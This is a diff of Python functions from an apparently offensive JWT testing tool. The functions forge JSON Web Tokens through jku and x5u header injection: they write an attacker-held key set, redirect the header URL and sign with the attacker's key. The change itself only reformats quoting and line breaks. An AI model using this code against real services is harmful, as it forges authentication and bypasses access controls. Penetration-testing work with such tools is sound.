@@ -170,12 +170,16 @@ def jkuVulnerability(jwt=None, url=None, file=None, pem=None):
     e = pub.public_numbers().e
     n = pub.public_numbers().n
 
-    jwks["keys"][0]["e"] = base64.urlsafe_b64encode(
-        e.to_bytes(e.bit_length() // 8 + 1, byteorder='big')
-    ).decode('UTF-8').rstrip('=')
-    jwks["keys"][0]["n"] = base64.urlsafe_b64encode(
-        n.to_bytes(n.bit_length() // 8 + 1, byteorder='big')
-    ).decode('UTF-8').rstrip('=')
+    jwks["keys"][0]["e"] = (
+        base64.urlsafe_b64encode(e.to_bytes(e.bit_length() // 8 + 1, byteorder="big"))
+        .decode("UTF-8")
+        .rstrip("=")
+    )
+    jwks["keys"][0]["n"] = (
+        base64.urlsafe_b64encode(n.to_bytes(n.bit_length() // 8 + 1, byteorder="big"))
+        .decode("UTF-8")
+        .rstrip("=")
+    )
 
     f = open(f"{file}.json", "w")
     f.write(json.dumps(jwks))
@@ -183,9 +187,13 @@ def jkuVulnerability(jwt=None, url=None, file=None, pem=None):
 
     s = encodeJwt(jwtJson)
 
-    sign = priv.sign(bytes(s, encoding='UTF-8'), algorithm=hashes.SHA256(), padding=padding.PKCS1v15())
+    sign = priv.sign(
+        bytes(s, encoding="UTF-8"),
+        algorithm=hashes.SHA256(),
+        padding=padding.PKCS1v15(),
+    )
 
-    return s + '.' + base64.urlsafe_b64encode(sign).decode('UTF-8').rstrip('=')
+    return s + "." + base64.urlsafe_b64encode(sign).decode("UTF-8").rstrip("=")
 
 
 def x5uVulnerability(jwt=None, crt=None, pem=None, url=None):
@@ -212,10 +220,11 @@ def x5uVulnerability(jwt=None, crt=None, pem=None, url=None):
         f.close()
 
     x5u = requests.get(jwtJson[HEADER]["x5u"]).json()
-    x5u["keys"][0]["x5c"] = content \
-        .replace("-----END CERTIFICATE-----", "") \
-        .replace("-----BEGIN CERTIFICATE-----", "") \
+    x5u["keys"][0]["x5c"] = (
+        content.replace("-----END CERTIFICATE-----", "")
+        .replace("-----BEGIN CERTIFICATE-----", "")
         .replace("\n", "")
+    )
 
     jwtJson[HEADER]["x5u"] = url
 
@@ -227,6 +236,10 @@ def x5uVulnerability(jwt=None, crt=None, pem=None, url=None):
     key = crypto.load_privatekey(crypto.FILETYPE_PEM, open(pem).read())
 
     priv = key.to_cryptography_key()
-    sign = priv.sign(bytes(s, encoding='UTF-8'), algorithm=hashes.SHA256(), padding=padding.PKCS1v15())
+    sign = priv.sign(
+        bytes(s, encoding="UTF-8"),
+        algorithm=hashes.SHA256(),
+        padding=padding.PKCS1v15(),
+    )
 
-    return s + '.' + base64.urlsafe_b64encode(sign).decode('UTF-8').rstrip('=')
+    return s + "." + base64.urlsafe_b64encode(sign).decode("UTF-8").rstrip("=")
